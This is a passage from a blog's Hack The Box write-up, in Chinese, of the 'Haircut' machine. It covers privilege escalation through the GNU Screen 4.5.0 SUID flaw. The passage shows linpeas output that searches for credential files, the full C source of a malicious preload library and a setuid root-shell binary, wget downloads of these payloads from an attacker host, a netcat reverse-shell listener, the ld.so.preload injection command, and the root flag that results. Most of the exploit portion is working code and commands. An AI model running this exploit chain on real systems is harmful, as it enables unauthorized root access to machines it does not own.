/var/backups/dpkg.arch.4.gz</span><br><span class="hljs-string">-rw-r--r-- 1 root root 2250 May 17  2017 /var/backups/alternatives.tar.1.gz</span><br><span class="hljs-string">-rw-r--r-- 1 root root 51200 May 26  2017 /var/backups/alternatives.tar.0</span><br><span class="hljs-string">-rw-r--r-- 1 root root 2622 May 16  2017 /var/backups/alternatives.tar.2.gz</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching passwords in history files</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching *password* or *credential* files in home (limit 70)</span><br><span class="hljs-string">/bin/systemd-ask-password                                                                </span><br><span class="hljs-string">/bin/systemd-tty-ask-password-agent</span><br><span class="hljs-string">/etc/pam.d/common-password</span><br><span class="hljs-string">/usr/lib/git-core/git-credential</span><br><span class="hljs-string">/usr/lib/git-core/git-credential-cache</span><br><span class="hljs-string">/usr/lib/git-core/git-credential-cache--daemon</span><br><span class="hljs-string">/usr/lib/git-core/git-credential-store</span><br><span class="hljs-string">  #)There are more creds/passwds files in the previous parent folder</span><br><span class="hljs-string"></span><br><span class="hljs-string">/usr/lib/grub/i386-pc/password.mod</span><br><span class="hljs-string">/usr/lib/grub/i386-pc/password_pbkdf2.mod</span><br><span class="hljs-string">/usr/lib/mysql/plugin/validate_password.so</span><br><span class="hljs-string">/usr/share/dns/root.key</span><br><span class="hljs-string">/usr/share/doc/git/contrib/credential</span><br><span class="hljs-string">/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c</span><br><span class="hljs-string">/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc</span><br><span class="hljs-string">/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c</span><br><span class="hljs-string">/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c</span><br><span class="hljs-string">/usr/share/locale-langpack/en_AU/LC_MESSAGES/ubuntuone-credentials.mo</span><br><span class="hljs-string">/usr/share/locale-langpack/en_GB/LC_MESSAGES/ubuntuone-credentials.mo</span><br><span class="hljs-string">/usr/share/man/man1/git-credential-cache--daemon.1.gz</span><br><span class="hljs-string">/usr/share/man/man1/git-credential-cache.1.gz</span><br><span class="hljs-string">/usr/share/man/man1/git-credential-store.1.gz</span><br><span class="hljs-string">/usr/share/man/man1/git-credential.1.gz</span><br><span class="hljs-string">  #)There are more creds/passwds files in the previous parent folder</span><br><span class="hljs-string"></span><br><span class="hljs-string">/usr/share/man/man7/gitcredentials.7.gz</span><br><span class="hljs-string">/usr/share/man/man8/systemd-ask-password-console.path.8.gz</span><br><span class="hljs-string">/usr/share/man/man8/systemd-ask-password-console.service.8.gz</span><br><span class="hljs-string">/usr/share/man/man8/systemd-ask-password-wall.path.8.gz</span><br><span class="hljs-string">/usr/share/man/man8/systemd-ask-password-wall.service.8.gz</span><br><span class="hljs-string">  #)There are more creds/passwds files in the previous parent folder</span><br><span class="hljs-string"></span><br><span class="hljs-string">/usr/share/pam/common-password.md5sums</span><br><span class="hljs-string">/var/cache/debconf/passwords.dat</span><br><span class="hljs-string">/var/lib/pam/password</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs</span><br><span class="hljs-string"></span><br><span class="hljs-string">╔══════════╣ Searching passwords inside logs (limit 70)</span><br><span class="hljs-string"> base-passwd depends on libc6 (&gt;= 2.8); however:                                         </span><br><span class="hljs-string"> base-passwd depends on libdebconfclient0 (&gt;= 0.145); however:</span><br><span class="hljs-string">10.10.14.4 - - [03/Jan/2024:09:35:43 +0100] &quot;GET /.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd HTTP/1.1&quot; 400 182 &quot;-&quot; &quot;-&quot;</span><br><span class="hljs-string">10.10.14.4 - - [03/Jan/2024:09:37:39 +0100] &quot;GET /cgi-bin/.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd HTTP/1.1&quot; 400 182 &quot;-&quot; &quot;-&quot;                                                          </span><br><span class="hljs-string">Description: Set up users and passwords</span><br><span class="hljs-string">Preparing to unpack .../base-passwd_3.5.39_amd64.deb ...</span><br><span class="hljs-string">Preparing to unpack .../passwd_1%3a4.2-3.1ubuntu5_amd64.deb ...</span><br><span class="hljs-string">Selecting previously unselected package base-passwd.</span><br><span class="hljs-string">Selecting previously unselected package passwd.</span><br><span class="hljs-string">Setting up base-passwd (3.5.39) ...</span><br><span class="hljs-string">Setting up passwd (1:4.2-3.1ubuntu5) ...</span><br><span class="hljs-string">Shadow passwords are now on.</span><br><span class="hljs-string">Unpacking base-passwd (3.5.39) ...</span><br><span class="hljs-string">Unpacking base-passwd (3.5.39) over (3.5.39) ...</span><br><span class="hljs-string">Unpacking passwd (1:4.2-3.1ubuntu5) ...</span><br><span class="hljs-string">dpkg: base-passwd: dependency problems, but configuring anyway as you requested:</span><br><span class="hljs-string">                                ╔════════════════╗</span><br><span class="hljs-string">════════════════════════════════╣ API Keys Regex ╠════════════════════════════════       </span><br><span class="hljs-string">                                ╚════════════════╝                                       </span><br><span class="hljs-string">Regexes to search for API keys aren&#x27;</span>t activated, use param <span class="hljs-string">&#x27;-r&#x27;</span> <br><br><br>www-data@haircut:/tmp$ <br></code></pre></td></tr></table></figure>

<p>16、按照正常来说，这里是 suid 提权的，但是我毕竟还是经验少，没有识别出来，这里参看演示报告</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@haircut:/tmp$ find / -perm -4000 -o -perm -2000 -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -perm -4000 -o -perm -2000 -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>/bin/ntfs-3g<br>/bin/ping6<br>/bin/fusermount<br>/bin/su<br>/bin/mount<br>/bin/ping<br>/bin/umount<br>/sbin/unix_chkpwd<br>/sbin/pam_extrausers_chkpwd<br>/usr/bin/sudo<br>/usr/bin/mlocate<br>/usr/bin/pkexec<br>/usr/bin/chage<br>/usr/bin/screen.old<br>/usr/bin/newuidmap<br>/usr/bin/crontab<br>/usr/bin/bsd-write<br>/usr/bin/newgrp<br>/usr/bin/newgidmap<br>/usr/bin/expiry<br>/usr/bin/gpasswd<br>/usr/bin/ssh-agent<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/screen-4.5.0<br>/usr/bin/chsh<br>/usr/bin/wall<br>/usr/bin/chfn<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/usr/lib/x86_64-linux-gnu/utempter/utempter<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/snapd/snap-confine<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>www-data@haircut:/tmp$<br></code></pre></td></tr></table></figure>

<p><code>/usr/bin/screen-4.5.0</code></p>
<p><code>https://www.exploit-db.com/exploits/41154</code></p>
<p>17、下载目标利用工具，发现无法在靶机上面利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@haircut:/tmp$ wget http://10.10.14.4/poc.sh<br>wget http://10.10.14.4/poc.sh<br>--2024-01-03 15:40:57--  http://10.10.14.4/poc.sh<br>Connecting to 10.10.14.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 1152 (1.1K) [text/x-sh]<br>Saving to: <span class="hljs-string">&#x27;poc.sh&#x27;</span><br><br>poc.sh              100%[===================&gt;]   1.12K  --.-KB/s    <span class="hljs-keyword">in</span> 0s      <br><br>2024-01-03 15:40:57 (24.6 MB/s) - <span class="hljs-string">&#x27;poc.sh&#x27;</span> saved [1152/1152]<br><br>www-data@haircut:/tmp$ <span class="hljs-built_in">chmod</span> +x poc.sh<br><span class="hljs-built_in">chmod</span> +x poc.sh<br>www-data@haircut:/tmp$ ./poc.sh<br>./poc.sh<br>~ gnu/screenroot ~<br>[+] First, we create our shell and library...<br>gcc: error trying to <span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;cc1&#x27;</span>: execvp: No such file or directory<br>gcc: error trying to <span class="hljs-built_in">exec</span> <span class="hljs-string">&#x27;cc1&#x27;</span>: execvp: No such file or directory<br>[+] Now we create our /etc/ld.so.preload file...<br>[+] Triggering...<br><span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">ERROR: ld.so: object &#x27;</span>/tmp/libhax.so<span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">No Sockets found in /tmp/screens/S-www-data.</span><br><span class="hljs-string"></span><br><span class="hljs-string">./poc.sh: line 42: /tmp/rootshell: No such file or directory</span><br><span class="hljs-string">www-data@haircut:/tmp$ </span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>

<p>18、然后我使用在线的box系统，进行本地编译使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-drvcllg9wi]─[~/Desktop]<br>└──╼ [★]$ <span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/libhax.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">#include &lt;sys/types.h&gt;</span><br><span class="hljs-string">#include &lt;unistd.h&gt;</span><br><span class="hljs-string">__attribute__ ((__constructor__))</span><br><span class="hljs-string">void dropshell(void)&#123;</span><br><span class="hljs-string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span><br><span class="hljs-string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span><br><span class="hljs-string">    unlink(&quot;/etc/ld.so.preload&quot;);</span><br><span class="hljs-string">    printf(&quot;[+] done!\n&quot;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-drvcllg9wi]─[~/Desktop]<br>└──╼ [★]$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c<br>/tmp/libhax.c: In <span class="hljs-keyword">function</span> ‘dropshell’:<br>/tmp/libhax.c:7:5: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘<span class="hljs-built_in">chmod</span>’ [-Wimplicit-function-declaration]<br>    7 |     <span class="hljs-built_in">chmod</span>(<span class="hljs-string">&quot;/tmp/rootshell&quot;</span>, 04755);<br>      |     ^~~~~<br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-drvcllg9wi]─[~/Desktop]<br>└──╼ [★]$ <span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; /tmp/rootshell.c</span><br><span class="hljs-string">#include &lt;stdio.h&gt;</span><br><span class="hljs-string">int main(void)&#123;</span><br><span class="hljs-string">    setuid(0);</span><br><span class="hljs-string">    setgid(0);</span><br><span class="hljs-string">    seteuid(0);</span><br><span class="hljs-string">    setegid(0);</span><br><span class="hljs-string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-drvcllg9wi]─[~/Desktop]<br>└──╼ [★]$ gcc -o /tmp/rootshell /tmp/rootshell.c<br>/tmp/rootshell.c: In <span class="hljs-keyword">function</span> ‘main’:<br>/tmp/rootshell.c:3:5: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘setuid’ [-Wimplicit-function-declaration]<br>    3 |     setuid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:4:5: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘setgid’ [-Wimplicit-function-declaration]<br>    4 |     setgid(0);<br>      |     ^~~~~~<br>/tmp/rootshell.c:5:5: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘seteuid’ [-Wimplicit-function-declaration]<br>    5 |     seteuid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:6:5: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘setegid’ [-Wimplicit-function-declaration]<br>    6 |     setegid(0);<br>      |     ^~~~~~~<br>/tmp/rootshell.c:7:5: warning: implicit declaration of <span class="hljs-keyword">function</span> ‘execvp’ [-Wimplicit-function-declaration]<br>    7 |     execvp(<span class="hljs-string">&quot;/bin/sh&quot;</span>, NULL, NULL);<br>      |     ^~~~~~<br>/tmp/rootshell.c:7:5: warning: too many arguments to built-in <span class="hljs-keyword">function</span> ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]<br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-drvcllg9wi]─[~/Desktop]<br>└──╼ [★]$ <br><br></code></pre></td></tr></table></figure>

<p>19、然后把编译好的exp上传到目标靶机上面进行利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-drvcllg9wi]─[~/Desktop]<br>└──╼ [★]$ python3 -m http.server 8000<br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br>10.10.10.24 - - [03/Jan/2024 15:25:26] <span class="hljs-string">&quot;GET /qsd-php-backdoor.php HTTP/1.1&quot;</span> 200 -<br>10.10.10.24 - - [03/Jan/2024 15:33:27] <span class="hljs-string">&quot;GET /libhax.so HTTP/1.1&quot;</span> 200 -<br>10.10.10.24 - - [03/Jan/2024 15:33:38] <span class="hljs-string">&quot;GET /rootshell HTTP/1.1&quot;</span> 200 -<br><br>┌─[us-vip-22]─[10.10.14.5]─[shiyan@htb-drvcllg9wi]─[~/Desktop]<br>└──╼ [★]$ nc -lvnp 10086<br>Ncat: Version 7.93 ( https://nmap.org/ncat )<br>Ncat: Listening on :::10086<br>Ncat: Listening on 0.0.0.0:10086<br>Ncat: Connection from 10.10.10.24.<br>Ncat: Connection from 10.10.10.24:44504.<br><span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">ERROR: ld.so: object &#x27;</span>/tmp/libhax.so<span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access <span class="hljs-built_in">tty</span>; job control turned off<br>$ python3 -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">ERROR: ld.so: object &#x27;</span>/tmp/libhax.so<span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object <span class="hljs-string">&#x27;/tmp/libhax.so&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br><span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">ERROR: ld.so: object &#x27;</span>/tmp/libhax.so<span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">www-data@haircut:~/html/uploads$ </span><br><span class="hljs-string"></span><br><span class="hljs-string">www-data@haircut:~/html/uploads$ cd /tmp</span><br><span class="hljs-string">cd /tmp</span><br><span class="hljs-string">www-data@haircut:/tmp$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object <span class="hljs-string">&#x27;/tmp/libhax.so&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>f<br>screens<br>systemd-private-77aca4f3922e4287ab678477723dad65-systemd-timesyncd.service-8Sh9jd<br>vmware-root<br>www-data@haircut:/tmp$ <br>www-data@haircut:/tmp$ wget 10.10.14.5/libhax.so<br>wget 10.10.14.5/libhax.so<br><span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">ERROR: ld.so: object &#x27;</span>/tmp/libhax.so<span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">--2024-01-03 16:33:00--  http://10.10.14.5/libhax.so</span><br><span class="hljs-string">Connecting to 10.10.14.5:80... connected.</span><br><span class="hljs-string">HTTP request sent, awaiting response... 405 Method Not Allowed</span><br><span class="hljs-string">2024-01-03 16:33:00 ERROR 405: Method Not Allowed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">www-data@haircut:/tmp$ wget 10.10.14.5:8000/libhax.so</span><br><span class="hljs-string">wget 10.10.14.5:8000/libhax.so</span><br><span class="hljs-string">&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>ERROR: ld.so: object <span class="hljs-string">&#x27;/tmp/libhax.so&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>--2024-01-03 16:33:28--  http://10.10.14.5:8000/libhax.so<br>Connecting to 10.10.14.5:8000... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 19656 (19K) [application/octet-stream]<br>Saving to: <span class="hljs-string">&#x27;libhax.so&#x27;</span><br><br>libhax.so           100%[===================&gt;]  19.20K  --.-KB/s    <span class="hljs-keyword">in</span> 0.01s   <br><br>2024-01-03 16:33:28 (1.54 MB/s) - <span class="hljs-string">&#x27;libhax.so&#x27;</span> saved [19656/19656]<br><br>www-data@haircut:/tmp$ wget 10.10.14.5:8000/rootshell<br>wget 10.10.14.5:8000/rootshell<br><span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">[+] done!</span><br><span class="hljs-string">--2024-01-03 16:33:38--  http://10.10.14.5:8000/rootshell</span><br><span class="hljs-string">Connecting to 10.10.14.5:8000... connected.</span><br><span class="hljs-string">HTTP request sent, awaiting response... 200 OK</span><br><span class="hljs-string">Length: 20288 (20K) [application/octet-stream]</span><br><span class="hljs-string">Saving to: &#x27;</span>rootshell<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">rootshell           100%[===================&gt;]  19.81K  --.-KB/s    in 0.01s   </span><br><span class="hljs-string"></span><br><span class="hljs-string">2024-01-03 16:33:38 (1.59 MB/s) - &#x27;</span>rootshell<span class="hljs-string">&#x27; saved [20288/20288]</span><br><span class="hljs-string"></span><br><span class="hljs-string">www-data@haircut:/tmp$ ls</span><br><span class="hljs-string">ls</span><br><span class="hljs-string">&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>[+] <span class="hljs-keyword">done</span>!<br>f<br>libhax.so<br>rootshell<br>screens<br>systemd-private-77aca4f3922e4287ab678477723dad65-systemd-timesyncd.service-8Sh9jd<br>vmware-root<br>www-data@haircut:/tmp$ <span class="hljs-built_in">cd</span> /etc<br><span class="hljs-built_in">cd</span> /etc<br>www-data@haircut:/etc$ <span class="hljs-built_in">umask</span> 000<br><span class="hljs-built_in">umask</span> 000<br>www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span><br>&lt;en-4.5.0 -D -m -L ld.so.preload <span class="hljs-built_in">echo</span> -ne  <span class="hljs-string">&quot;\x0a/tmp/libhax.so&quot;</span>              <br><span class="hljs-string">&#x27; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="hljs-string">[+] done!</span><br><span class="hljs-string">www-data@haircut:/etc$ screen-4.5.0 -ls</span><br><span class="hljs-string">screen-4.5.0 -ls</span><br><span class="hljs-string">&#x27;</span> from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br>[+] <span class="hljs-keyword">done</span>!<br>No Sockets found <span class="hljs-keyword">in</span> /tmp/screens/S-www-data.<br></code></pre></td></tr></table></figure>

<p>20、成功上传后，开始漏洞利用，并获取到权限，以及flag信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@haircut:/etc$ /tmp/rootshell<br>/tmp/rootshell<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br><span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br>46d1029a451cc74bbb249969b46f61fb<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>


<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/21</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Haircut-htb-writeup</div>
      <div>https://sh1yan.top/2024/01/03/Haircut-htb-writeup/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年1月3日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/01/04/SolidState-htb-writeup/" title="SolidState-htb-writeup">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">SolidState-htb-writeup</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/01/02/Popcorn-htb-writeup/" title="Popcorn-htb-writeup">
                        <span class="hidden-mobile">Popcorn-htb-writeup</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
